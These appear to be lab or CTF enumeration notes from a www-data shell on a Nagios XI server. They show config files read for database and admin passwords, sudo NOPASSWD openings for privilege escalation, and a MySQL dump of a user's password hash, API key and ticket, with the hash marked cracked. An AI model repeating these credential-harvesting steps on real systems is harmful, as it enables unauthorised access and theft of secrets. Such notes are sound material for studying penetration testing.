# 3 :80 box enum > www-data

```
www-data@ubuntu:/usr/local/nagiosxi/html$ cat config.inc.php
nagiosxi" => array(
        "dbtype" => 'mysql',
        "dbserver" => '',
        "user" => 'nagiosxi',
        "pwd" => 'n@gweb',
        "db" => 'nagiosxi',
		
"ndoutils" => array(
        "dbtype" => 'mysql',
        "dbserver" => 'localhost',
        "user" => 'ndoutils',
        "pwd" => 'n@gweb',
        "db" => 'nagios',
		
"nagiosql" => array(
        "dbtype" => 'mysql',
        "dbserver" => 'localhost',
        "user" => 'nagiosql',
        "pwd" => 'n@gweb',
        "db" => 'nagiosql',

"username" => 'nagiosxi', // don't change this!
"password" => 'nagiosadmin', // this gets reset when security credentials are reset after installation
"username" => 'nagiosadmin', // don't change this!
"password" => 'nagiosadmin', // 

www-data@ubuntu:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Sep  8  2020 .
drwxr-xr-x 23 root    root    4096 Sep  8  2020 ..
drwxr-xr-x  2 coconut coconut 4096 Mar 23 04:27 coconut
```

#### SuidEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/local/nagios/libexec/check_dhcp
/usr/local/nagios/libexec/check_icmp
------------------------------
```

#### PEAS

```
Linux version 4.4.0-186-generic (buildd@lcy01-amd64-002) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.7 LTS
Release:        16.04

╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:7878          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -

╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/tail -100 /var/log/messages
    (root) NOPASSWD: /usr/bin/tail -100 /var/log/httpd/error_log
    (root) NOPASSWD: /usr/bin/tail -100 /var/log/mysqld.log
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php *
    (root) NOPASSWD: /usr/local/nagiosxi/html/includes/components/profile/getprofile.sh
    (root) NOPASSWD: /etc/init.d/snmptt restart
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/repair_databases.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
	
╣ Users with console
coconut:x:1000:1000:Coconut,,,:/home/coconut:/bin/bash
postgres:x:113:122:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
root:x:0:0:root:/root:/bin/bash

╣ Analyzing PostgreSQL Files (limit 70)
Version: psql (PostgreSQL) 9.5.23
-rw-r----- 1 postgres postgres 4641 Sep  8  2020 /etc/postgresql/9.5/main/pg_hba.conf
-rw-r--r-- 1 postgres postgres 21722 Sep  8  2020 /etc/postgresql/9.5/main/postgresql.conf

╣ Searching GitLab related files
Found /usr/local/nagiosxi/scripts/automation/ansible/ncpa_autoregister/secrets.yml
$ANSIBLE_VAULT;1.1;AES256
36343032613063663330623739393935353065616434363839386465376237653430363431323837
3132393237333437336265333863616662613764646262320a623764613731393630303438666432
38666364363834346133643637643332633761326262666561366464313164626431616464383666
6130646434373336370a653166366538316263316661383063336135336135333437373432383233
36393762643936613431336238366536666133346562396331323937376362646265656166393465
30373866333264663334316335333132346364353631306631663333613361356564663239623966
62643838306466626466323264383265343536386566646630353231386462306165343731316630
32333864313035643566

# can write more files in directory
/usr/local/nagvis/etc/profiles
```

#### Mysql Enum

```
www-data@ubuntu:/tmp$ mysql -u nagiosxi -p
Enter password: n@gweb

# db: nagiosxi | table: xi_users
mysql> select username, password, email, backend_ticket, api_key from xi_users;
+-------------+--------------------------------------------------------------+----------------+----------------------------------+------------------------------------------------------------------+
| username    | password                                                     | email          | backend_ticket                   | api_key                                                          |
+-------------+--------------------------------------------------------------+----------------+----------------------------------+------------------------------------------------------------------+
| nagiosadmin | $2a$10$c26dab3cb40383360d8e9uqHF.4fqxdeWeQechX1F7CjMl6j0rF2u | root@localhost | HGsQ8GQHVNFsl52abBDHUXoQMGPKs7bp | BYFOBd32Oe6ToIJGKbDM9LL0mUp0ocbgrP42imj6EoZi7YXQpQSCBESdOidcNIre |
+-------------+--------------------------------------------------------------+----------------+----------------------------------+------------------------------------------------------------------+
# $2a$10$c26dab3cb40383360d8e9uqHF.4fqxdeWeQechX1F7CjMl6j0rF2u:admin
```
